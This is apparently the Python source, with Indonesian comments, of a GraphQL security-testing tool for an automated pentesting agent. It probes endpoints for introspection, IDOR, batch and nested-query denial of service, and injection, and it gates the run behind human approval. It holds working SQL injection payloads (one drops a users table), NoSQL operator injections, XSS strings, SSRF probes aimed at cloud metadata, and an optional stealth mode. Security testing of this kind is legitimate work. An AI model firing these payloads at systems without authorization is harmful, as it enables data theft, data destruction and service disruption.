from core.tool_transport import guarded_requests as requests
import json
import time
from core.tool_decorator import langchain_tool as tool
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from tools.custom_tools import exec_logger
from core.rate_limiter import rate_limiter
from core.auth_store import auth_get, auth_post
from core.auth_store import get_auth_kwargs

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass


def _domain_of(url: str) -> str:
    try:
        from urllib.parse import urlparse
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/query",
    "/api/query",
    "/gql",
    "/api/gql",
    "/graphiql",
    "/playground",
]

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

def _detect_graphql(base_url: str) -> list:
    """Auto-detect GraphQL endpoints."""
    found = []
    domain = _domain_of(base_url)
    auth_kw = get_auth_kwargs(domain)
    for path in GRAPHQL_PATHS:
        try:
            rate_limiter.wait(_domain_of(base_url))
            url = f"{base_url.rstrip('/')}{path}"

            # Coba POST with query kosong dulu
            resp = auth_post(
                url,
                json={"query": "{ __typename }"},
                headers={"Content-Type": "application/json"},
                **auth_kw,
                timeout=5,
                verify=False,
            )

            # GraphQL endpoint biasanya return JSON with key "data" atau "errors"
            if resp.status_code in (200, 400):
                try:
                    data = resp.json()
                    if "data" in data or "errors" in data:
                        found.append(url)
                        exec_logger.add_log("GraphQL Tester", "SUCCESS", f"GraphQL endpoint found: {path}")
                except Exception:
                    pass

        except Exception:
            pass

    return found


def _test_introspection(endpoint: str) -> dict:
    """Test apakah introspection diaktifin."""
    try:
        rate_limiter.wait(_domain_of(endpoint))
        resp = auth_post(
            endpoint,
            json={"query": INTROSPECTION_QUERY},
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
        )

        data = resp.json()

        if "data" in data and "__schema" in data.get("data", {}):
            schema = data["data"]["__schema"]
            types = schema.get("types", [])

            # Filter built-in types
            custom_types = [
                t for t in types
                if t["name"] and not t["name"].startswith("__")
            ]

            # Cari field that suspicious
            sensitive_keywords = [
                "password", "secret", "token", "key", "admin",
                "internal", "private", "credential", "auth", "debug"
            ]

            suspicious_fields = []
            for t in custom_types:
                for field in (t.get("fields") or []):
                    fname = field.get("name", "").lower()
                    if any(kw in fname for kw in sensitive_keywords):
                        suspicious_fields.append(f"{t['name']}.{field['name']}")

            return {
                "vulnerable": True,
                "severity": "High",
                "total_types": len(custom_types),
                "type_names": [t["name"] for t in custom_types[:20]],
                "suspicious_fields": suspicious_fields,
                "query_type": schema.get("queryType", {}).get("name"),
                "mutation_type": schema.get("mutationType", {}).get("name"),
            }

        elif "errors" in data:
            error_msg = str(data["errors"]).lower()
            if "introspection" in error_msg or "disabled" in error_msg:
                return {"vulnerable": False, "note": "Introspection explicitly disabled"}

    except Exception as e:
        return {"vulnerable": False, "error": str(e)}

    return {"vulnerable": False}


def _test_batch_query(endpoint: str) -> dict:
    """Test batch query for bypass rate limiting."""
    try:
        rate_limiter.wait(_domain_of(endpoint))

        # Kirim 10 query sekaligus dalam satu request
        batch = [{"query": "{ __typename }"}] * 10

        resp = auth_post(
            endpoint,
            json=batch,
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                # Kalau response-nya array = batch query received
                if isinstance(data, list) and len(data) > 1:
                    return {
                        "vulnerable": True,
                        "severity": "Medium",
                        "detail": f"Server menerima {len(data)} query sekaligus dalam 1 request — can dieksploitasi for bypass rate limiting on mutation login/register"
                    }
            except Exception:
                pass

    except Exception:
        pass

    return {"vulnerable": False}


def _test_deep_nested(endpoint: str) -> dict:
    """Test deep nested query (potential DoS)."""
    try:
        rate_limiter.wait(_domain_of(endpoint))

        # Bikin nested query 8 level dalam
        nested = "{ __typename " + "a: __typename { " * 8 + "}" * 8 + " }"

        start = time.time()
        resp = auth_post(
            endpoint,
            json={"query": nested},
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
        )
        duration = time.time() - start

        if resp.status_code == 200 and duration > 3:
            return {
                "vulnerable": True,
                "severity": "Medium",
                "detail": f"Server memproses nested query dalam {duration:.1f}s — not found query depth limiting, rentan DoS"
            }
        elif resp.status_code == 200:
            try:
                data = resp.json()
                # Kalau gak ada error soal depth = depth limit gak ada
                if "errors" not in data:
                    return {
                        "vulnerable": True,
                        "severity": "Low",
                        "detail": "Not ada query depth limiting terdeteksi — nested query received tanpa pembatasan"
                    }
            except Exception:
                pass

    except Exception:
        pass

    return {"vulnerable": False}


def _test_field_suggestion(endpoint: str) -> dict:
    """Test apakah field suggestion expose info sensitif."""
    try:
        rate_limiter.wait(_domain_of(endpoint))

        # Query field that salah sengaja
        resp = auth_post(
            endpoint,
            json={"query": "{ usr { passwrd emai } }"},
            headers={"Content-Type": "application/json"},
            timeout=5,
            verify=False,
        )

        data = resp.json()
        errors = str(data.get("errors", "")).lower()

        # Cek apakah error message expose field names
        if "did you mean" in errors or "suggestion" in errors:
            return {
                "vulnerable": True,
                "severity": "Low",
                "detail": f"Server memberikan field suggestion on error — can dieksploitasi for enumerate schema tanpa introspection",
                "error_sample": str(data.get("errors", ""))[:300]
            }

    except Exception:
        pass

    return {"vulnerable": False}


def _test_idor(endpoint: str, query_type: str = "Query") -> dict:
    """Test basic IDOR via GraphQL ID manipulation."""
    findings = []

    # Common query patterns that sering ada
    idor_queries = [
        '{ user(id: "2") { id email } }',
        '{ user(id: 2) { id email } }',
        '{ profile(id: "2") { id email } }',
        '{ account(id: 2) { id email } }',
        '{ order(id: 2) { id total } }',
    ]

    for query in idor_queries:
        try:
            rate_limiter.wait(_domain_of(endpoint))
            resp = auth_post(
                endpoint,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=5,
                verify=False,
            )

            data = resp.json()

            # Kalau ada data balik (bukan error) = potential IDOR
            if "data" in data and data["data"]:
                inner = list(data["data"].values())
                if inner and inner[0] is not None:
                    findings.append({
                        "type": "Potential IDOR",
                        "severity": "High",
                        "query": query,
                        "detail": "Query success return data tanpa autentikasi — perlu manual verify apakah data milik user lain can diakses"
                    })
                    exec_logger.add_log("GraphQL Tester", "WARNING", f"Potential IDOR: {query[:50]}")
                    break  # Cukup satu finding, sisanya manual

        except Exception:
            pass

    return findings


def _test_subscription(endpoint: str) -> dict:
    """Test GraphQL subscription endpoint availability."""
    try:
        # Common subscription paths
        subscription_paths = [
            endpoint.replace("/graphql", "/graphql"),
            endpoint.replace("/graphql", "/subscriptions"),
            endpoint.replace("/graphql", "/ws"),
        ]

        for sub_url in subscription_paths:
            try:
                rate_limiter.wait(_domain_of(endpoint))
                # Try WebSocket upgrade
                resp = auth_get(
                    sub_url,
                    headers={
                        "Upgrade": "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Version": "13",
                        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    },
                    timeout=5,
                    verify=False,
                )

                if resp.status_code == 101:
                    return {
                        "vulnerable": True,
                        "severity": "Medium",
                        "detail": f"WebSocket subscription endpoint available at {sub_url} — potential for subscription-based attacks",
                        "endpoint": sub_url,
                    }
            except Exception:
                pass

    except Exception:
        pass

    return {"vulnerable": False}


def _test_batch_query_dos(endpoint: str) -> dict:
    """Test batch query DoS with large batch."""
    try:
        rate_limiter.wait(_domain_of(endpoint))

        # Kirim 50 query sekaligus
        batch = [{"query": "{ __typename }"}] * 50

        import time
        start = time.time()
        resp = auth_post(
            endpoint,
            json=batch,
            headers={"Content-Type": "application/json"},
            timeout=15,
            verify=False,
        )
        duration = time.time() - start

        if resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and len(data) > 1:
                    # Check apakah server memproses all query
                    success_count = sum(1 for r in data if isinstance(r, dict) and "data" in r)
                    if success_count > 10:
                        return {
                            "vulnerable": True,
                            "severity": "Medium",
                            "detail": f"Server memproses {success_count}/50 query dalam {duration:.1f}s — batch query DoS possible",
                            "batch_size": 50,
                            "success_count": success_count,
                            "duration": round(duration, 2),
                        }
            except Exception:
                pass

    except Exception:
        pass

    return {"vulnerable": False}


def _test_schema_stitching(endpoint: str) -> dict:
    """Test apakah server expose multiple schemas (schema stitching)."""
    try:
        # Query for detect multiple schemas
        queries = [
            '{ __schema { queryType { name } } }',
            '{ __schema { mutationType { name } } }',
            '{ __service { sdl } }',  # Apollo Federation
        ]

        schemas_found = []
        for query in queries:
            try:
                rate_limiter.wait(_domain_of(endpoint))
                resp = auth_post(
                    endpoint,
                    json={"query": query},
                    headers={"Content-Type": "application/json"},
                    timeout=5,
                    verify=False,
                )

                data = resp.json()
                if "data" in data and data["data"]:
                    schemas_found.append(query[:50])
            except Exception:
                pass

        if len(schemas_found) > 1:
            return {
                "vulnerable": True,
                "severity": "Low",
                "detail": f"Multiple schema types exposed — possible schema stitching/federation",
                "schemas_found": schemas_found,
            }

    except Exception:
        pass

    return {"vulnerable": False}


def _test_injection(endpoint: str) -> dict:
    """Test GraphQL injection vulnerabilities."""
    findings = []

    # ── SQL Injection via GraphQL ─────────────────────────────────────────────
    sql_payloads = [
        "{ user(id: \"1' OR '1'='1\") { id email } }",
        "{ user(id: \"1' UNION SELECT NULL,NULL,NULL--\") { id email } }",
        "{ user(id: \"1; DROP TABLE users--\") { id email } }",
        "{ user(name: \"test' OR '1'='1\") { id email } }",
        "{ user(email: \"test@test.com' OR '1'='1\") { id email } }",
    ]

    for payload in sql_payloads:
        try:
            rate_limiter.wait(_domain_of(endpoint))
            resp = auth_post(
                endpoint,
                json={"query": payload},
                headers={"Content-Type": "application/json"},
                timeout=5,
                verify=False,
            )

            data = resp.json()
            # Check for SQL error indicators
            error_text = str(data.get("errors", "")).lower()
            sql_indicators = ["sql", "syntax", "mysql", "postgresql", "sqlite", "ora-"]
            if any(ind in error_text for ind in sql_indicators):
                findings.append({
                    "type": "GraphQL SQL Injection",
                    "severity": "Critical",
                    "query": payload[:100],
                    "detail": f"SQL error detected in GraphQL response: {error_text[:200]}",
                })
                exec_logger.add_log("GraphQL Tester", "WARNING", f"SQL injection via GraphQL: {payload[:50]}")
                break
        except Exception:
            pass

    # ── NoSQL Injection via GraphQL ───────────────────────────────────────────
    nosql_payloads = [
        '{ user(id: {"$gt": ""}) { id email } }',
        '{ user(name: {"$ne": ""}) { id email } }',
        '{ user(email: {"$regex": ".*"}) { id email } }',
        '{ user(id: {"$where": "this.password"}) { id email } }',
    ]

    for payload in nosql_payloads:
        try:
            rate_limiter.wait(_domain_of(endpoint))
            resp = auth_post(
                endpoint,
                json={"query": payload},
                headers={"Content-Type": "application/json"},
                timeout=5,
                verify=False,
            )

            data = resp.json()
            # Check if query returned data (injection successful)
            if "data" in data and data["data"]:
                inner = list(data["data"].values())
                if inner and inner[0] is not None:
                    findings.append({
                        "type": "GraphQL NoSQL Injection",
                        "severity": "Critical",
                        "query": payload[:100],
                        "detail": "NoSQL injection returned data — operator injection successful",
                    })
                    exec_logger.add_log("GraphQL Tester", "WARNING", f"NoSQL injection via GraphQL: {payload[:50]}")
                    break
        except Exception:
            pass

    # ── XSS via GraphQL ───────────────────────────────────────────────────────
    xss_payloads = [
        '{ user(id: "1") { name } }<script>alert(1)</script>',
        '{ user(id: "1<img src=x onerror=alert(1)>") { name } }',
        '{ user(id: "1\" onmouseover=\"alert(1)\") { name } }',
    ]

    for payload in xss_payloads:
        try:
            rate_limiter.wait(_domain_of(endpoint))
            resp = auth_post(
                endpoint,
                json={"query": payload},
                headers={"Content-Type": "application/json"},
                timeout=5,
                verify=False,
            )

            # Check if XSS payload reflected in response
            if "<script>" in resp.text or "alert(" in resp.text or "onerror=" in resp.text:
                findings.append({
                    "type": "GraphQL XSS",
                    "severity": "High",
                    "query": payload[:100],
                    "detail": "XSS payload reflected in GraphQL response",
                })
                exec_logger.add_log("GraphQL Tester", "WARNING", f"XSS via GraphQL: {payload[:50]}")
                break
        except Exception:
            pass

    # ── SSRF via GraphQL ──────────────────────────────────────────────────────
    ssrf_payloads = [
        '{ user(id: "1") { name } } @rest(url: "http://169.254.169.254/") { __typename }',
        '{ internalData @http(url: "http://127.0.0.1/") { __typename } }',
    ]

    for payload in ssrf_payloads:
        try:
            rate_limiter.wait(_domain_of(endpoint))
            resp = auth_post(
                endpoint,
                json={"query": payload},
                headers={"Content-Type": "application/json"},
                timeout=5,
                verify=False,
            )

            # Check for SSRF indicators
            ssrf_indicators = ["ami-id", "instance-id", "local-ipv4", "169.254"]
            if any(ind in resp.text for ind in ssrf_indicators):
                findings.append({
                    "type": "GraphQL SSRF",
                    "severity": "Critical",
                    "query": payload[:100],
                    "detail": "SSRF via GraphQL directive — internal metadata accessible",
                })
                exec_logger.add_log("GraphQL Tester", "WARNING", f"SSRF via GraphQL: {payload[:50]}")
                break
        except Exception:
            pass

    return findings


@tool("graphql_tester")
def graphql_tester(target_url: str) -> str:
    """
    Testing implementasi GraphQL on target for menemukan kerentanan:
    - Introspection enabled (schema disclosure)
    - Batch query attack (rate limit bypass)
    - Deep nested query (DoS)
    - Field suggestion (schema enumeration)
    - IDOR via ID manipulation
    
    Args:
        target_url: Base URL target (contoh: https://target.com)
    """
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"GraphQL security testing on {target_url}",
        context="Test: introspection, batch query, nested DoS, field suggestion, IDOR",
        risk="medium",
        exec_logger=exec_logger,
    )
    if not approved:
        return "TEST DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    exec_logger.add_log("GraphQL Tester", "START", f"Starting GraphQL testing on {target_url}")

    # Inject auth session jika ada
    from urllib.parse import urlparse
    domain = urlparse(target_url).netloc.split(":")[0].lower()
    auth_kwargs = get_auth_kwargs(domain)

    # Step 1: Detect endpoint
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Detecting GraphQL endpoints")
    endpoints = _detect_graphql(target_url)

    if not endpoints:
        return f"[+] Not found GraphQL endpoint on {target_url}. Target kemungkinan pake REST API."

    endpoint = endpoints[0]
    exec_logger.add_log("GraphQL Tester", "SUCCESS", f"Testing endpoint: {endpoint}")

    all_findings = []

    # Step 2: Introspection
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing introspection")
    introspection = _test_introspection(endpoint)

    # Step 3: Batch query
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing batch query")
    batch = _test_batch_query(endpoint)
    if batch.get("vulnerable"):
        all_findings.append(batch)

    # Step 4: Deep nested
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing query depth")
    nested = _test_deep_nested(endpoint)
    if nested.get("vulnerable"):
        all_findings.append(nested)

    # Step 5: Field suggestion
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing field suggestion")
    suggestion = _test_field_suggestion(endpoint)
    if suggestion.get("vulnerable"):
        all_findings.append(suggestion)

    # Step 6: IDOR
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing IDOR")
    idor_findings = _test_idor(endpoint)
    all_findings.extend(idor_findings)

    # Step 7: Subscription
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing subscription endpoints")
    subscription = _test_subscription(endpoint)
    if subscription.get("vulnerable"):
        all_findings.append(subscription)

    # Step 8: Batch Query DoS
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing batch query DoS")
    batch_dos = _test_batch_query_dos(endpoint)
    if batch_dos.get("vulnerable"):
        all_findings.append(batch_dos)

    # Step 9: Schema Stitching
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing schema stitching")
    stitching = _test_schema_stitching(endpoint)
    if stitching.get("vulnerable"):
        all_findings.append(stitching)

    # Step 10: Injection Testing
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN."
    exec_logger.add_log("GraphQL Tester", "PROCESSING", "Testing injection vectors (SQLi, NoSQLi, XSS, SSRF)")
    injection_findings = _test_injection(endpoint)
    all_findings.extend(injection_findings)

    # Build report
    exec_logger.add_log("GraphQL Tester", "SUCCESS", f"GraphQL testing selesai. Findings: {len(all_findings)}")

    output = f"=== GRAPHQL SECURITY TEST RESULTS FOR {target_url} ===\n\n"
    output += f"Endpoint: {endpoint}\n\n"

    # Introspection section (special handling karena banyak info)
    if introspection.get("vulnerable"):
        output += f"[🔴 HIGH] Introspection Enabled\n"
        output += f"  Total custom types: {introspection['total_types']}\n"
        output += f"  Types: {', '.join(introspection['type_names'])}\n"
        if introspection.get("suspicious_fields"):
            output += f"  ⚠️  Suspicious fields: {', '.join(introspection['suspicious_fields'])}\n"
        if introspection.get("mutation_type"):
            output += f"  Mutation type: {introspection['mutation_type']} (write operations available)\n"
    else:
        output += f"[✅] Introspection: Disabled\n"

    # Other findings
    if all_findings:
        output += "\n"
        for f in all_findings:
            severity = f.get("severity", "Medium")
            emoji = "🔴" if severity == "High" else "🟠" if severity == "Medium" else "🟡"
            output += f"[{emoji} {severity}] {f.get('type', 'Finding')}\n"
            output += f"  {f.get('detail', '')}\n"
            if "error_sample" in f:
                output += f"  Sample: {f['error_sample']}\n"

    if not introspection.get("vulnerable") and not all_findings:
        output += "\n[+] Not found kerentanan GraphQL that obvious. GraphQL implementation tampak cukup hardened.\n"

    output += "\n⚠️  Manual verification tetap required for confirmation all findings.\n"

    # ── GRAPHQL-COP CONFIRMATION STEP ─────────────────────────────────────────
    if not check_cancelled(exec_logger):
        exec_logger.add_log("GraphQL Tester", "PROCESSING", "Running graphql-cop for additional testing")
        try:
            from core.tool_transport import guarded_subprocess as subprocess
            import tempfile
            import os

            # Create temp output file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                output_file = f.name

            # Run graphql-cop
            cmd = [
                "python3",
                "/opt/graphql-cop/graphql-cop.py",
                "-t", endpoint,
                "-o", output_file,
                "-q",  # Quiet mode
            ]

            # Apply stealth mode
            if os.environ.get("STEALTH_MODE", "0") == "1":
                cmd.append("--delay")

            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=120,
            )

            # Parse graphql-cop output
            graphql_cop_findings = []
            if os.path.exists(output_file):
                try:
                    import json
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, list):
                            for item in data:
                                graphql_cop_findings.append({
                                    "type": f"GraphQL-Cop: {item.get('test', 'Unknown')}",
                                    "severity": item.get("severity", "Medium"),
                                    "detail": item.get("result", ""),
                                })
                except Exception:
                    pass
                finally:
                    try:
                        os.unlink(output_file)
                    except:
                        pass

            # Also parse stdout for findings
            for line in result.stdout.split('\n'):
                if 'VULNERABLE' in line or 'HIGH' in line or 'MEDIUM' in line:
                    graphql_cop_findings.append({
                        "type": "GraphQL-Cop Finding",
                        "severity": "High" if "HIGH" in line else "Medium",
                        "detail": line.strip(),
                    })

            if graphql_cop_findings:
                all_findings.extend(graphql_cop_findings)
                exec_logger.add_log("GraphQL Tester", "WARNING",
                    f"graphql-cop found {len(graphql_cop_findings)} additional findings")

        except subprocess.TimeoutExpired:
            exec_logger.add_log("GraphQL Tester", "WARNING", "graphql-cop timed out")
        except FileNotFoundError:
            exec_logger.add_log("GraphQL Tester", "WARNING", "graphql-cop not found")
        except Exception as e:
            exec_logger.add_log("GraphQL Tester", "WARNING", f"graphql-cop error: {str(e)[:100]}")

    return output